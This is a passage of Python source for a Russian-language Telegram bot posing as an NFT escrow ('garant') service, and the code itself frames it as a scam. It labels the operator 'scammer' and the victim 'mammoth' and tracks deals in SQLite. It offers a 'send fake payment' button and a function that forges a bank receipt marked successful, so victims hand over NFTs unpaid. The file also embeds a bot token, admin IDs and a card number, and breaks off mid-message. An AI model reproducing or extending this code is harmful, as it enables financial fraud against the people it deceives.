"""
NFT Garant Bot - Стабильная версия с requests
Токен: 8031857941:AAHScgAH_2KthkTdokaio9UQS3SIkyWJv8Q
Админы: 6400547924, 7170622064
Карта гаранта: 5447147777488296
"""

import json
import sqlite3
import random
import time
import os
import sys
import re
from datetime import datetime
import traceback
from urllib.parse import quote
import requests  # Используем requests вместо urllib

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "8031857941:AAHScgAH_2KthkTdokaio9UQS3SIkyWJv8Q"
ADMIN_IDS = [6400547924, 7170622064]
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
POLL_TIMEOUT = 5  # Короткий таймаут для getUpdates
SCAMMER_CARD = "5447147777488296"
MAX_RETRIES = 3
RETRY_DELAY = 2

print(f"🤖 NFT Garant Bot запускается...")
print(f"Админы: {ADMIN_IDS}")
print(f"Карта гаранта: {SCAMMER_CARD}")

# ==================== БАЗА ДАННЫХ ====================
def init_database():
    """Инициализация базы данных"""
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS deals (
                id TEXT PRIMARY KEY,
                scammer_id INTEGER,
                mammoth_id INTEGER,
                price REAL,
                gift_link TEXT,
                mammoth_card TEXT,
                scammer_card TEXT,
                status TEXT DEFAULT 'active',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                deal_link TEXT,
                mammoth_confirmed INTEGER DEFAULT 0,
                scammer_confirmed INTEGER DEFAULT 0,
                fake_payment_sent INTEGER DEFAULT 0
            )
        ''')
        
        # Проверяем и добавляем отсутствующие колонки
        cursor.execute("PRAGMA table_info(deals)")
        columns = [column[1] for column in cursor.fetchall()]
        
        if 'fake_payment_sent' not in columns:
            print("🔄 Добавляем колонку 'fake_payment_sent'...")
            cursor.execute('ALTER TABLE deals ADD COLUMN fake_payment_sent INTEGER DEFAULT 0')
        if 'deal_link' not in columns:
            print("🔄 Добавляем колонку 'deal_link'...")
            cursor.execute('ALTER TABLE deals ADD COLUMN deal_link TEXT')
        if 'mammoth_confirmed' not in columns:
            print("🔄 Добавляем колонку 'mammoth_confirmed'...")
            cursor.execute('ALTER TABLE deals ADD COLUMN mammoth_confirmed INTEGER DEFAULT 0')
        if 'scammer_confirmed' not in columns:
            print("🔄 Добавляем колонку 'scammer_confirmed'...")
            cursor.execute('ALTER TABLE deals ADD COLUMN scammer_confirmed INTEGER DEFAULT 0')
        
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_deal_id ON deals(id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_scammer_id ON deals(scammer_id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_mammoth_id ON deals(mammoth_id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_status ON deals(status)')
        
        conn.commit()
        conn.close()
        print("✅ База данных инициализирована")
        return True
    except Exception as e:
        print(f"❌ Ошибка БД: {e}")
        traceback.print_exc()
        return False

def check_database():
    """Проверка состояния базы данных"""
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM deals')
        count = cursor.fetchone()[0]
        
        cursor.execute('SELECT id, status, created_at FROM deals ORDER BY created_at DESC LIMIT 5')
        recent_deals = cursor.fetchall()
        
        conn.close()
        
        print(f"📊 Состояние базы данных:")
        print(f"   • Всего сделок: {count}")
        if recent_deals:
            print(f"   • Последние сделки:")
            for deal_id, status, created_at in recent_deals:
                print(f"     - {deal_id} ({status}, создана: {created_at})")
        else:
            print(f"   • Сделок нет")
        
        return True
    except Exception as e:
        print(f"❌ Ошибка проверки базы данных: {e}")
        return False

def save_deal(deal_id, scammer_id, price, gift_link, mammoth_card, deal_link):
    """Сохранение сделки"""
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        
        scammer_card_clean = re.sub(r'\D', '', SCAMMER_CARD)
        
        cursor.execute('''
            INSERT OR REPLACE INTO deals 
            (id, scammer_id, price, gift_link, mammoth_card, scammer_card, deal_link, 
             status, mammoth_confirmed, scammer_confirmed, fake_payment_sent)
            VALUES (?, ?, ?, ?, ?, ?, ?, 'active', 0, 0, 0)
        ''', (deal_id, scammer_id, price, gift_link, mammoth_card, scammer_card_clean, deal_link))
        
        conn.commit()
        conn.close()
        print(f"✅ Сделка {deal_id} сохранена")
        return True
    except Exception as e:
        print(f"❌ Ошибка сохранения сделки: {e}")
        traceback.print_exc()
        return False

def get_deal(deal_id):
    """Получение сделки"""
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        
        # Только точное совпадение
        cursor.execute('''
            SELECT id, scammer_id, mammoth_id, price, gift_link, 
                   mammoth_card, scammer_card, status, deal_link,
                   mammoth_confirmed, scammer_confirmed, fake_payment_sent
            FROM deals WHERE id = ?
        ''', (deal_id,))
        
        row = cursor.fetchone()
        conn.close()
        
        if row:
            columns = ['id', 'scammer_id', 'mammoth_id', 'price', 'gift_link', 
                      'mammoth_card', 'scammer_card', 'status', 'deal_link',
                      'mammoth_confirmed', 'scammer_confirmed', 'fake_payment_sent']
            return dict(zip(columns, row))
        return None
    except Exception as e:
        print(f"❌ Ошибка получения сделки: {e}")
        return None

def set_mammoth(deal_id, mammoth_id):
    """Привязка мамонта"""
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        
        # Проверяем, свободна ли сделка
        cursor.execute('''
            SELECT mammoth_id FROM deals 
            WHERE id = ? AND status = 'active'
        ''', (deal_id,))
        
        row = cursor.fetchone()
        if row and row[0] is not None:
            conn.close()
            return False
        
        cursor.execute('''
            UPDATE deals 
            SET mammoth_id = ?, status = 'waiting'
            WHERE id = ? AND status = 'active'
        ''', (mammoth_id, deal_id))
        
        updated = cursor.rowcount > 0
        conn.commit()
        conn.close()
        print(f"✅ Мамонт {mammoth_id} привязан к сделке {deal_id}")
        return updated
    except Exception as e:
        print(f"❌ Ошибка привязки мамонта: {e}")
        return False

def confirm_deal(deal_id, user_type):
    """Подтверждение сделки"""
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        
        # Получаем текущие подтверждения
        cursor.execute('SELECT mammoth_confirmed, scammer_confirmed FROM deals WHERE id = ?', (deal_id,))
        row = cursor.fetchone()
        if not row:
            conn.close()
            return 'error'
            
        mammoth_conf, scammer_conf = row
        
        # Обновляем подтверждение
        if user_type == 'scammer':
            cursor.execute('UPDATE deals SET scammer_confirmed = 1 WHERE id = ?', (deal_id,))
            scammer_conf = 1
        else:
            cursor.execute('UPDATE deals SET mammoth_confirmed = 1 WHERE id = ?', (deal_id,))
            mammoth_conf = 1
        
        # Проверяем, завершена ли сделка
        result = 'partial'
        if mammoth_conf == 1 and scammer_conf == 1:
            cursor.execute('UPDATE deals SET status = "completed" WHERE id = ?', (deal_id,))
            result = 'completed'
        
        conn.commit()
        conn.close()
        print(f"✅ Подтверждение от {user_type} для сделки {deal_id}: {result}")
        return result
    except Exception as e:
        print(f"❌ Ошибка подтверждения сделки: {e}")
        traceback.print_exc()
        return 'error'

def set_fake_payment_sent(deal_id):
    """Отметка об отправленном фейк платеже"""
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        
        cursor.execute('UPDATE deals SET fake_payment_sent = 1 WHERE id = ?', (deal_id,))
        
        conn.commit()
        conn.close()
        print(f"✅ Фейк платеж для сделки {deal_id} отмечен как отправленный")
        return True
    except Exception as e:
        print(f"❌ Ошибка отметки фейк платежа: {e}")
        return False

# ==================== TELEGRAM API ====================
def telegram_request(method, params=None, data=None, retry_count=0):
    """Запрос к API через requests"""
    url = f"{TELEGRAM_API}/{method}"
    
    try:
        # print(f"🌐 Запрос к API: {method}")  # Можно раскомментировать для отладки
        
        if method == 'getUpdates' and params:
            # Для getUpdates используем params и короткий таймаут
            response = requests.post(url, params=params, timeout=POLL_TIMEOUT + 5)
        elif data:
            # Для других методов
            headers = {'Content-Type': 'application/json'}
            response = requests.post(url, json=data, headers=headers, timeout=10)
        else:
            response = requests.post(url, timeout=10)
        
        response.raise_for_status()
        result = response.json()
        
        if not result.get('ok', False):
            print(f"⚠️ API {method} вернул ошибку: {result}")
        
        return result
        
    except requests.exceptions.Timeout:
        print(f"⏰ Таймаут запроса {method}")
        if retry_count < MAX_RETRIES:
            print(f"🔄 Повторная попытка {retry_count + 1}/{MAX_RETRIES}...")
            time.sleep(RETRY_DELAY)
            return telegram_request(method, params, data, retry_count + 1)
        return {'ok': False, 'description': 'Timeout'}
        
    except requests.exceptions.RequestException as e:
        print(f"❌ Ошибка сети API {method}: {e}")
        if retry_count < MAX_RETRIES:
            print(f"🔄 Повторная попытка {retry_count + 1}/{MAX_RETRIES}...")
            time.sleep(RETRY_DELAY)
            return telegram_request(method, params, data, retry_count + 1)
        return {'ok': False, 'description': str(e)}
        
    except Exception as e:
        print(f"❌ API Error {method}: {e}")
        traceback.print_exc()
        return {'ok': False, 'description': str(e)}

def send_message(chat_id, text, keyboard=None, parse_mode='HTML'):
    """Отправка сообщения"""
    data = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': parse_mode,
        'disable_web_page_preview': True
    }
    
    if keyboard:
        data['reply_markup'] = keyboard
    
    return telegram_request('sendMessage', data=data)

def answer_callback_query(callback_query_id, text=None, show_alert=False):
    """Ответ на callback"""
    data = {
        'callback_query_id': callback_query_id,
        'show_alert': show_alert
    }
    
    if text:
        data['text'] = text
    
    return telegram_request('answerCallbackQuery', data=data)

# ==================== УТИЛИТЫ ====================
def generate_deal_id():
    """Генерация уникального ID сделки"""
    timestamp = int(time.time()) % 100000
    random_part = random.randint(1000, 9999)
    return f"NFT{timestamp}{random_part}"

def validate_card(card_number):
    """Проверка карты (16-19 цифр)"""
    if not card_number:
        return False
    card_clean = re.sub(r'\D', '', str(card_number))
    return 16 <= len(card_clean) <= 19

def format_card(card_number):
    """Форматирование карты"""
    if not card_number:
        return "Не указана"
    card_clean = re.sub(r'\D', '', str(card_number))
    if len(card_clean) >= 16:
        parts = [card_clean[i:i+4] for i in range(0, min(len(card_clean), 16), 4)]
        return ' '.join(parts)
    return card_clean

def format_price(price):
    """Форматирование цены"""
    try:
        price_num = float(price)
        return f"{price_num:,.0f}".replace(',', ' ') + ' ₽'
    except:
        return str(price) + ' ₽'

def cleanup_user_state(user_id, user_states):
    """Безопасная очистка состояния пользователя"""
    try:
        if user_id in user_states:
            print(f"🧹 Очистка состояния для пользователя {user_id}")
            del user_states[user_id]
    except Exception as e:
        print(f"⚠️ Ошибка очистки состояния: {e}")

def is_admin(user_id):
    """Проверка, является ли пользователь админом"""
    return user_id in ADMIN_IDS

def generate_fake_bank_receipt(deal):
    """Генерация фейкового банковского чека"""
    receipt_id = random.randint(1000000000, 9999999999)
    date = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    
    mammoth_card_clean = re.sub(r'\D', '', str(deal.get('mammoth_card', '')))
    scammer_card_clean = re.sub(r'\D', '', str(deal.get('scammer_card', '')))
    
    mammoth_last4 = mammoth_card_clean[-4:] if len(mammoth_card_clean) >= 4 else '0000'
    scammer_last4 = scammer_card_clean[-4:] if len(scammer_card_clean) >= 4 else '0000'
    
    receipt = (
        f"💳 <b>БАНКОВСКИЙ ЧЕК</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🏦 <b>Операция:</b> Перевод средств\n"
        f"📄 <b>Номер операции:</b> {receipt_id}\n"
        f"🕐 <b>Дата и время:</b> {date}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Отправитель:</b>\n"
        f"Карта: •••• {scammer_last4}\n"
        f"Сумма списания: {format_price(deal.get('price', 0))}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Получатель:</b>\n"
        f"Карта: •••• {mammoth_last4}\n"
        f"Сумма зачисления: {format_price(deal.get('price', 0))}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💸 <b>Комиссия:</b> 0 ₽\n"
        f"💰 <b>Итого:</b> {format_price(deal.get('price', 0))}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Статус:</b> УСПЕШНО\n"
        f"⏳ <b>До зачисления на баланс бота:</b> ~1 минута\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>Средства успешно списаны и отправлены на обработку</i>"
    )
    
    return receipt

# ==================== ОСНОВНАЯ ЛОГИКА ====================
class NFTBot:
    def __init__(self):
        self.bot_username = None
        self.last_update_id = 0
        self.user_states = {}
        self.running = True
        
        print("🔄 Получение информации о боте...")
        
        # Получаем информацию о боте
        for attempt in range(MAX_RETRIES):
            try:
                print(f"Попытка {attempt + 1}/{MAX_RETRIES}...")
                bot_info = telegram_request('getMe')
                
                if bot_info and bot_info.get('ok'):
                    self.bot_username = bot_info['result'].get('username')
                    print(f"✅ Username бота: @{self.bot_username}")
                    break
                else:
                    error_msg = bot_info.get('description', 'Неизвестная ошибка') if bot_info else 'Нет ответа от сервера'
                    print(f"❌ Попытка {attempt + 1}: {error_msg}")
                    
                    if attempt < MAX_RETRIES - 1:
                        print(f"⏳ Повтор через 3 секунды...")
                        time.sleep(3)
            except Exception as e:
                print(f"❌ Исключение при попытке {attempt + 1}: {e}")
                if attempt < MAX_RETRIES - 1:
                    time.sleep(3)
        
        if not self.bot_username:
            print("⚠️ Не удалось получить username бота")
            self.bot_username = "nft_garant_bot"
            print(f"⚠️ Используем временный username: @{self.bot_username}")
        
        if not BOT_TOKEN or len(BOT_TOKEN) < 10:
            print("❌ Ошибка: Неверный токен бота")
            sys.exit(1)
        
        print("🔄 Инициализация базы данных...")
        if not init_database():
            print("❌ Не удалось инициализировать БД")
            sys.exit(1)
        
        print("🔄 Проверка базы данных...")
        check_database()
        
        print("✅ Бот инициализирован")
        print(f"📊 Конфигурация:")
        print(f"   • Токен: {BOT_TOKEN[:10]}...")
        print(f"   • Username: @{self.bot_username}")
        print(f"   • Админы: {len(ADMIN_IDS)} пользователей")
    
    def start_polling(self):
        """Основной цикл"""
        print("=" * 60)
        print("📡 Бот запущен. Ожидание команд...")
        print("🛑 Ctrl+C для остановки")
        print("=" * 60)
        
        # Проверка подключения
        test_result = telegram_request('getMe')
        if test_result and test_result.get('ok'):
            print("✅ Подключение к Telegram API успешно")
        else:
            print("❌ Ошибка подключения к Telegram API")
            print(f"   Ответ сервера: {test_result}")
        
        while self.running:
            try:
                updates = self.get_updates()
                if updates:
                    for update in updates:
                        self.process_update(update)
                time.sleep(0.1)  # Короткая задержка между проверками
            except KeyboardInterrupt:
                print("\n🛑 Бот остановлен пользователем")
                self.running = False
                break
            except Exception as e:
                print(f"❌ Ошибка в основном цикле: {e}")
                time.sleep(1)
    
    def get_updates(self):
        """Получение обновлений"""
        try:
            params = {
                'timeout': POLL_TIMEOUT,
                'offset': self.last_update_id + 1,
                'allowed_updates': ['message', 'callback_query']
            }
            
            result = telegram_request('getUpdates', params=params)
            
            if result and result.get('ok'):
                updates = result.get('result', [])
                if updates:
                    self.last_update_id = updates[-1]['update_id']
                return updates
            return []
        except Exception as e:
            print(f"❌ Ошибка в get_updates: {e}")
            return []
    
    def process_update(self, update):
        """Обработка обновления"""
        try:
            if 'message' in update:
                self.process_message(update['message'])
            elif 'callback_query' in update:
                self.process_callback(update['callback_query'])
        except Exception as e:
            print(f"❌ Ошибка обработки обновления: {e}")
            traceback.print_exc()
    
    def process_message(self, message):
        """Обработка сообщения"""
        try:
            chat_id = message['chat']['id']
            user_id = message['from']['id']
            text = message.get('text', '').strip()
            
            # Проверяем состояние пользователя
            if user_id in self.user_states:
                state = self.user_states[user_id]
                if state.get('waiting_for_price'):
                    self.handle_price_input(chat_id, user_id, text)
                    return
                elif state.get('waiting_for_link'):
                    self.handle_link_input(chat_id, user_id, text)
                    return
                elif state.get('waiting_for_card'):
                    self.handle_card_input(chat_id, user_id, text)
                    return
            
            # Обработка команд
            if text.startswith('/start'):
                parts = text.split()
                if len(parts) > 1:
                    deal_id = parts[1].strip()
                    self.handle_mammoth_start(chat_id, user_id, deal_id)
                    return
                
                self.handle_start(chat_id, user_id)
            
            elif is_admin(user_id):
                if text == '/skamoffers':
                    self.handle_create_menu(chat_id)
                elif text == '/offers':
                    self.handle_offers(chat_id)
                elif text == '/link':
                    self.handle_get_link(chat_id, user_id)
                elif text == '/help':
                    self.handle_help(chat_id, user_id)
                elif text.startswith('/create'):
                    self.handle_quick_create(chat_id, user_id, text)
                elif text == '/status':
                    self.handle_status(chat_id)
                else:
                    self.handle_unknown_command(chat_id, user_id)
            else:
                if text.startswith('/'):
                    self.handle_unknown_command(chat_id, user_id)
                else:
                    self.handle_start(chat_id, user_id)
                    
        except Exception as e:
            print(f"❌ Ошибка обработки сообщения: {e}")
            traceback.print_exc()
    
    def process_callback(self, callback):
        """Обработка callback"""
        try:
            query_id = callback['id']
            user_id = callback['from']['id']
            data = callback.get('data', '')
            
            # Всегда отвечаем на callback
            answer_callback_query(query_id, "⏳ Обработка...")
            
            if data == 'create_deal':
                message = callback.get('message', {})
                chat_id = message.get('chat', {}).get('id')
                if chat_id:
                    self.handle_create_deal_start(chat_id, user_id)
                else:
                    print("❌ Не удалось получить chat_id из callback")
            elif data.startswith('confirm_scammer_'):
                deal_id = data.replace('confirm_scammer_', '')
                self.handle_scammer_confirm(query_id, deal_id, user_id)
            elif data.startswith('confirm_mammoth_'):
                deal_id = data.replace('confirm_mammoth_', '')
                self.handle_mammoth_confirm(query_id, deal_id, user_id)
            elif data.startswith('fake_payment_'):
                deal_id = data.replace('fake_payment_', '')
                self.handle_fake_payment(query_id, deal_id, user_id)
            else:
                print(f"⚠️ Неизвестный callback data: {data}")
                answer_callback_query(query_id, "❌ Неизвестная команда")
        except Exception as e:
            print(f"❌ Ошибка обработки callback: {e}")
            traceback.print_exc()
    
    def handle_start(self, chat_id, user_id):
        """Обработка /start"""
        is_admin_user = is_admin(user_id)
        
        message = (
            f"🎉 <b>NFT GARANT BOT</b>\n\n"
            f"✌️ <b>Подпишитесь пожалуйста на наш канал будем очень благодарны : @NFTelegramG</b>\n\n"
            f"👤 <b>Ваш ID:</b> <code>{user_id}</code>\n"
            f"{'🎭 <b>Роль:</b> ГАРАНТ (отправляет деньги)' if is_admin_user else '🎭 <b>Роль:</b> ОТПРАВИТЕЛЬ (отправляет NFT)'}\n"
            f"🕐 <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}\n\n"
        )
        
        if is_admin_user:
            message += (
                "<b>👑 КОМАНДЫ АДМИНА:</b>\n"
                "• /skamoffers - Создать сделку\n"
                "• /offers - Активные сделки\n"
                "• /link - Получить ссылку\n"
                "• /status - Статус бота\n"
                "• /help - Помощь\n\n"
                "<b>Быстрое создание:</b>\n"
                "<code>/create [сумма] [ссылка] [карта]</code>"
            )
        else:
            message += (
                "<b>📋 КАК РАБОТАТЬ:</b>\n"
                "• Получите ссылку от гаранта\n"
                "• Перейдите по ссылке\n"
                "• Отправьте NFT и подтвердите\n"
                "• Ожидайте подтверждения от гаранта\n\n"
                "🛡️ <b>Гарантии безопасности</b>"
            )
        
        send_message(chat_id, message)
    
    def handle_create_menu(self, chat_id):
        """Обработка /skamoffers"""
        message = (
            "💰 <b>СОЗДАНИЕ СДЕЛКИ</b>\n\n"
            "Гарант отправляет деньги → Получатель отправляет NFT\n\n"
            "<b>Нажмите кнопку для пошагового создания:</b>"
        )
        
        keyboard = {
            'inline_keyboard': [[
                {'text': '🎁 СОЗДАТЬ СДЕЛКУ', 'callback_data': 'create_deal'}
            ]]
        }
        
        send_message(chat_id, message, keyboard)
    
    def handle_create_deal_start(self, chat_id, user_id):
        """Начало создания сделки"""
        if not is_admin(user_id):
            send_message(chat_id, "❌ Доступ запрещен. Только для гарантов.")
            return
        
        self.user_states[user_id] = {
            'chat_id': chat_id,
            'waiting_for_price': True,
            'deal_data': {}
        }
        
        send_message(chat_id, "💰 Введите сумму в рублях (сколько вы отправляете):")
    
    def handle_price_input(self, chat_id, user_id, text):
        """Ввод суммы"""
        if user_id not in self.user_states:
            send_message(chat_id, "❌ Сессия устарела. Начните заново.")
            cleanup_user_state(user_id, self.user_states)
            return
        
        try:
            # Убираем пробелы и запятые
            clean_text = text.replace(' ', '').replace(',', '.')
            price = float(clean_text)
            
            if price <= 0:
                send_message(chat_id, "❌ Сумма должна быть больше 0")
                return
            
            if price > 10000000:  # Ограничение 10 млн
                send_message(chat_id, "❌ Сумма слишком большая. Максимум 10,000,000 ₽")
                return
            
            self.user_states[user_id]['deal_data']['price'] = price
            self.user_states[user_id]['waiting_for_price'] = False
            self.user_states[user_id]['waiting_for_link'] = True
            
            send_message(chat_id, "🎨 Введите ссылку на NFT (которое должен отправить получатель):")
        except ValueError:
            send_message(chat_id, "❌ Неверный формат суммы. Введите число (например: 15000 или 15000.50)")
    
    def handle_link_input(self, chat_id, user_id, text):
        """Ввод ссылки"""
        if user_id not in self.user_states:
            send_message(chat_id, "❌ Сессия устарела. Начните заново.")
            cleanup_user_state(user_id, self.user_states)
            return
        
        gift_link = text.strip()
        if not gift_link.startswith(('http://', 'https://')):
            gift_link = 'https://' + gift_link
        
        # Простая проверка URL
        if len(gift_link) < 10 or ' ' in gift_link:
            send_message(chat_id, "❌ Неверная ссылка. Попробуйте еще раз.")
            return
        
        self.user_states[user_id]['deal_data']['gift_link'] = gift_link
        self.user_states[user_id]['waiting_for_link'] = False
        self.user_states[user_id]['waiting_for_card'] = True
        
        send_message(chat_id, "💳 Введите номер карты получателя (16-19 цифр):")
    
    def handle_card_input(self, chat_id, user_id, text):
        """Ввод карты получателя"""
        if user_id not in self.user_states:
            send_message(chat_id, "❌ Сессия устарела. Начните заново.")
            cleanup_user_state(user_id, self.user_states)
            return
        
        if not validate_card(text):
            send_message(chat_id, "❌ Неверный номер карты. Введите 16-19 цифр")
            return
        
        deal_data = self.user_states[user_id]['deal_data']
        mammoth_card = format_card(text)
        
        deal_id = generate_deal_id()
        state_chat_id = self.user_states[user_id].get('chat_id', chat_id)
        
        if not self.bot_username:
            send_message(state_chat_id, "❌ Ошибка: не удалось получить username бота")
            cleanup_user_state(user_id, self.user_states)
            return
        
        # Создаем ссылку
        deal_link = f"https://t.me/{self.bot_username}?start={deal_id}"
        
        success = save_deal(
            deal_id, user_id, deal_data['price'],
            deal_data['gift_link'], mammoth_card, deal_link
        )
        
        if not success:
            send_message(state_chat_id, "❌ Ошибка сохранения сделки")
            cleanup_user_state(user_id, self.user_states)
            return
        
        scammer_card_formatted = format_card(SCAMMER_CARD)
        
        message = (
            f"✅ <b>СДЕЛКА СОЗДАНА!</b>\n\n"
            f"<b>ВЫ: Гарант (отправляете деньги)</b>\n"
            f"<b>ПОЛУЧАТЕЛЬ: Отправляет NFT</b>\n\n"
            f"📋 <b>Детали:</b>\n"
            f"├ ID: <code>{deal_id}</code>\n"
            f"├ Сумма: <b>{format_price(deal_data['price'])}</b>\n"
            f"├ NFT от получателя: {deal_data['gift_link']}\n"
            f"├ Карта получателя: <code>{mammoth_card}</code>\n"
            f"└ Ваша карта: <code>{scammer_card_formatted}</code>\n\n"
            f"🔗 <b>Ссылка для получателя:</b>\n"
            f"<code>{deal_link}</code>\n\n"
            f"📝 <b>Инструкция:</b>\n"
            f"1. Отправьте ссылку получателю\n"
            f"2. Получатель отправит NFT и подтвердит\n"
            f"3. Вы отправите деньги и подтвердите\n\n"
            f"<b>Дополнительное действие:</b>"
        )
        
        keyboard = {
            'inline_keyboard': [
                [
                    {'text': '✅ Подтверждаю отправку денег', 'callback_data': f'confirm_scammer_{deal_id}'}
                ],
                [
                    {'text': '💸 Отправить фейк платеж', 'callback_data': f'fake_payment_{deal_id}'}
                ]
            ]
        }
        
        send_message(state_chat_id, message, keyboard)
        cleanup_user_state(user_id, self.user_states)
    
    def handle_quick_create(self, chat_id, user_id, text):
        """Быстрое создание через /create"""
        if not is_admin(user_id):
            send_message(chat_id, "❌ Доступ запрещен. Только для гарантов.")
            return
        
        parts = text.split(maxsplit=3)
        if len(parts) < 4:
            send_message(chat_id,
                "❌ Неверный формат\n"
                "Используйте: /create [сумма] [ссылка] [карта]\n"
                "Пример: /create 15000 https://opensea.io/nft/123 1234567812345678")
            return
        
        try:
            price_str = parts[1].replace(',', '.')
            price = float(price_str)
            gift_link = parts[2]
            mammoth_card_raw = parts[3]
            
            if price <= 0:
                send_message(chat_id, "❌ Сумма должна быть больше 0")
                return
            
            if not validate_card(mammoth_card_raw):
                send_message(chat_id, "❌ Неверный номер карты")
                return
            
            if not gift_link.startswith(('http://', 'https://')):
                gift_link = 'https://' + gift_link
            
            mammoth_card = format_card(mammoth_card_raw)
            deal_id = generate_deal_id()
            
            if not self.bot_username:
                send_message(chat_id, "❌ Ошибка: не удалось получить username бота")
                return
            
            deal_link = f"https://t.me/{self.bot_username}?start={deal_id}"
            
            success = save_deal(deal_id, user_id, price, gift_link, mammoth_card, deal_link)
            
            if not success:
                send_message(chat_id, "❌ Ошибка сохранения сделки")
                return
            
            scammer_card_formatted = format_card(SCAMMER_CARD)
            
            message = (
                f"✅ <b>СДЕЛКА СОЗДАНА!</b>\n\n"
                f"<b>ВЫ: Гарант (отправляете деньги)</b>\n"
                f"<b>ПОЛУЧАТЕЛЬ: Отправляет NFT</b>\n\n"
                f"📋 <b>Детали:</b>\n"
                f"├ ID: <code>{deal_id}</code>\n"
                f"├ Сумма: <b>{format_price(price)}</b>\n"
                f"├ NFT от получателя: {gift_link}\n"
                f"├ Карта получателя: <code>{mammoth_card}</code>\n"
                f"└ Ваша карта: <code>{scammer_card_formatted}</code>\n\n"
                f"🔗 <b>Ссылка для получателя:</b>\n"
                f"<code>{deal_link}</code>\n\n"
                f"<b>Дополнительное действие:</b>"
            )
            
            keyboard = {
                'inline_keyboard': [
                    [
                        {'text': '✅ Подтверждаю отправку денег', 'callback_data': f'confirm_scammer_{deal_id}'}
                    ],
                    [
                        {'text': '💸 Отправить фейк платеж', 'callback_data': f'fake_payment_{deal_id}'}
                    ]
                ]
            }
            
            send_message(chat_id, message, keyboard)
            
        except ValueError:
            send_message(chat_id, "❌ Неверный формат суммы")
        except Exception as e:
            send_message(chat_id, f"❌ Ошибка: {str(e)[:100]}")
            print(f"❌ Ошибка в быстром создании: {e}")
            traceback.print_exc()
    
    def handle_mammoth_start(self, chat_id, user_id, deal_id):
        """Обработка перехода мамонта по ссылке"""
        if is_admin(user_id):
            send_message(chat_id, "⚠️ Вы гарант. Для создания сделок используйте /skamoffers")
            return
        
        clean_deal_id = deal_id.strip()
        print(f"🔍 Поиск сделки для мамонта: '{clean_deal_id}'")
        
        deal = get_deal(clean_deal_id)
        
        if not deal:
            print(f"❌ Сделка '{clean_deal_id}' не найдена в базе данных")
            send_message(chat_id, f"❌ Сделка '{clean_deal_id}' не найдена")
            return
        
        print(f"✅ Сделка найдена: ID={deal['id']}, статус={deal['status']}")
        
        if deal['status'] != 'active':
            status_msg = {
                'waiting': 'ожидает подтверждения',
                'completed': 'завершена',
                'cancelled': 'отменена'
            }.get(deal['status'], deal['status'])
            
            send_message(chat_id, f"⚠️ Сделка {status_msg}")
            return
        
        success = set_mammoth(deal['id'], user_id)
        
        if not success:
            send_message(chat_id, "⚠️ Сделка уже занята другим пользователем")
            return
        
        scammer_card_formatted = format_card(deal.get('scammer_card', SCAMMER_CARD))
        
        message = (
            f"🎁 <b>ВЫ ПОЛУЧАТЕЛЬ NFT</b>\n\n"
            f"<b>Вам предлагают сделку!</b>\n\n"
            f"📋 <b>Детали:</b>\n"
            f"├ ID: <code>{deal['id']}</code>\n"
            f"├ Сумма: <b>{format_price(deal['price'])}</b>\n"
            f"├ Ваше NFT для отправки: {deal['gift_link']}\n"
            f"├ Ваша карта для получения: <code>{deal['mammoth_card']}</code>\n"
            f"└ Карта бота гаранта ( С нее вы получите платеж ): <code>{scammer_card_formatted}</code>\n\n"
            f"🛡️ <b>Процесс:</b>\n"
            f"1. Вы отправляете NFT\n"
            f"2. Гарант отправляет деньги\n"
            f"3. Вы подтверждаете отправку NFT\n"
            f"4. Гарант подтверждает отправку денег\n\n"
            f"<b>После отправки NFT нажмите кнопку:</b>"
        )
        
        keyboard = {
            'inline_keyboard': [[
                {'text': '✅ Подтверждаю отправку NFT', 'callback_data': f'confirm_mammoth_{deal["id"]}'}
            ]]
        }
        
        send_message(chat_id, message, keyboard)
    
    def handle_scammer_confirm(self, query_id, deal_id, user_id):
        """Подтверждение гаранта (отправка денег)"""
        deal = get_deal(deal_id)
        
        if not deal:
            answer_callback_query(query_id, "❌ Сделка не найдена", show_alert=True)
            return
        
        if user_id != deal['scammer_id']:
            answer_callback_query(query_id, "❌ Вы не гарант этой сделки", show_alert=True)
            return
        
        if deal['status'] != 'waiting':
            answer_callback_query(query_id, f"❌ Сделка уже {deal['status']}", show_alert=True)
            return
        
        result = confirm_deal(deal_id, 'scammer')
        
        if result == 'completed':
            # Сообщение гаранту
            scammer_msg = (
                f"🎉 <b>СДЕЛКА #{deal_id} ЗАВЕРШЕНА!</b>\n\n"
                f"✅ Получатель подтвердил отправку NFT\n"
                f"✅ Вы подтвердили отправку денег\n\n"
                f"💰 Сумма: {format_price(deal['price'])}\n"
                f"🎨 NFT получено: {deal['gift_link']}\n\n"
                f"⏳ Операция завершена успешно"
            )
            send_message(user_id, scammer_msg)
            
            # Сообщение получателю
            if deal['mammoth_id']:
                mammoth_msg = (
                    f"🎉 <b>СДЕЛКА #{deal_id} ЗАВЕРШЕНА!</b>\n\n"
                    f"✅ Вы подтвердили отправку NFT\n"
                    f"✅ Гарант подтвердил отправку денег\n\n"
